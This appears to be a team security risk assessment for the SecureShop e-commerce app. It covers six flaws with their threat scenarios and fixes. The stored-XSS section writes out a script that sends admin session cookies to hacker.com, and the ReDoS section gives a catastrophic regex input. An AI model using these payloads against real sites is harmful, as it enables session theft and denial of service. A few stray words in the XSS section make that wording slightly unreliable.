# Security Risk Assessment Report for SecureShop

## 1. Executive Summary
This report analyzes the security posture of the **SecureShop** e-commerce application. We have identified six (6) significant feature-wise risks that currently expose the platform to financial loss, data breaches, and service disruption. Each risk has been assigned to a specific team member for remediation through the implementation of targeted security controls.

## 2. Risk Assessment Matrix

| ID | Feature | Top Risk Identified | Likelihood | Impact | Risk Level | Accountable Member |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **R1** | Authentication (Login) | Brute Force Attacks | High | High | **Critical** | Member 1 |
| **R2** | Product Mgmt (Update) | Broken Object Level Authorization (BOLA) | Medium | High | **High** | Member 2 |
| **R3** | Order Processing | Price Manipulation | High | Critical | **Critical** | Member 3 |
| **R4** | User Profile | Stored Cross-Site Scripting (XSS) | Medium | High | **High** | Member 4 |
| **R5** | Search Feature | Regular Expression DoS (ReDoS) | Low | Medium | **Medium** | Member 5 |
| **R6** | API Responses | Excessive Data Exposure | High | Medium | **High** | Member 6 |

---

## 3. Detailed Risk Analysis & Controls

### Risk 1: Brute Force Attacks (Authentication)
*   **Accountable Member**: Member 1
*   **Vulnerability**: The `/api/auth/login` endpoint does not limit the number of failed login attempts.
*   **Threat Scenario**: An attacker uses a botnet to try thousands of username/password combinations (credential stuffing) until they successfully hijack an administrator or customer account.
*   **Impact**: Unauthorized access to user accounts, data theft, and potential full system compromise if an admin account is breached.
*   **Control to be Implemented**: **Rate Limiting & Account Lockout**. Implement a middleware (e.g., `express-rate-limit`) to restrict requests to 5 per minute per IP, and temporarily lock accounts after 5 failed attempts.

### Risk 2: Broken Object Level Authorization (BOLA) (Product Management)
*   **Accountable Member**: Member 2
*   **Vulnerability**: The `PUT /api/product/:id` endpoint checks if a user is a 'Merchant' but fails to verify if the merchant *owns* the specific product being updated.
*   **Threat Scenario**: A malicious merchant captures the ID of a competitor's product and sends a `PUT` request to change its price or description, sabotaging the competitor's sales.
*   **Impact**: Data integrity loss, financial damage to other merchants, and loss of platform reputation.
*   **Control to be Implemented**: **Resource Ownership Verification**. Modify the update logic to query the database and ensure `product.merchantId` matches the `current_user.id` before allowing the update.

### Risk 3: Price Manipulation (Order Processing)
*   **Accountable Member**: Member 3
*   **Vulnerability**: The `POST /api/order/add` endpoint trusts the `total` price sent in the client's JSON body (`req.body.total`).
*   **Threat Scenario**: An attacker intercepts the checkout request using a proxy tool (like Burp Suite) and modifies the `total` field from $1000.00 to $0.01 before sending it to the server.
*   **Impact**: Direct financial loss to the business as items are sold for a fraction of their value.
*   **Control to be Implemented**: **Server-Side Price Validation**. The backend must ignore the client-provided total and recalculate the order total by fetching product prices directly from the database during order creation.

### Risk 4: Stored Cross-Site Scripting (XSS) (User Profile)
*   **Accountable Member**: Member 4
*   **Vulnerability**: The `PUT /api/user` endpoint saves user profile data (e.g., 'Bio' or 'First Name') directly to the database without sanitization.
*   **Threat Scenario**: An attacker updates their profile name to include a malicious script script: `<script>fetch('http://hacker.com?cookie='+document.cookie)</script>`. When an Admin views the user list, the script executes in the Admin's browser, stealing their session cookies.
*   **Impact**: specific Account Takeover (ATO) of verify high-privilege accounts (Admins).
*   **Control to be Implemented**: **Input Sanitization**. Implement a library like `dompurify` or `xss-clean` on the backend to strip distinct dangerous HTML tags from inputs before saving them to MongoDB.

### Risk 5: Regular Expression Denial of Service (ReDoS) (Search)
*   **Accountable Member**: Member 5
*   **Vulnerability**: The user search endpoint `/api/user/search` constructs a `new RegExp(search)` directly from user input.
*   **Threat Scenario**: An attacker sends a specially crafted, complex regex payload (e.g., `(a+)+$`). The regex engine takes an exponential amount of time to process the string, blocking the Node.js event loop.
*   **Impact**: Denial of Service (DoS). The server becomes unresponsive to all other users, crashing the application.
*   **Control to be Implemented**: **Input Validation & Safe Search**. Validate that search terms satisfy a specific schema (alphanumeric only) or use MongoDB's native `$text` search feature instead of regex for broad patterns.

### Risk 6: Excessive Data Exposure (API Responses)
*   **Accountable Member**: Member 6
*   **Vulnerability**: API endpoints like `GET /api/user/me` or `/api/orders` return full Mongoose documents using `res.json(userDoc)`.
*   **Threat Scenario**: Although encryption keys might not be present, internal flags like `isAdmin`, `verificationToken`, or `salt` might be leaked. This allows attackers to understand the internal data model and plan further attacks.
*   **Impact**: Privacy violation and information leakage that aids reconnaissance for privilege escalation.
*   **Control to be Implemented**: **Response Transformation (DTOs)**. Implement a utility function or interceptor that explicitly selects only safe fields (DTO pattern) to return to the client (e.g., `return { id: user.id, email: user.email }`), filtering out everything else.
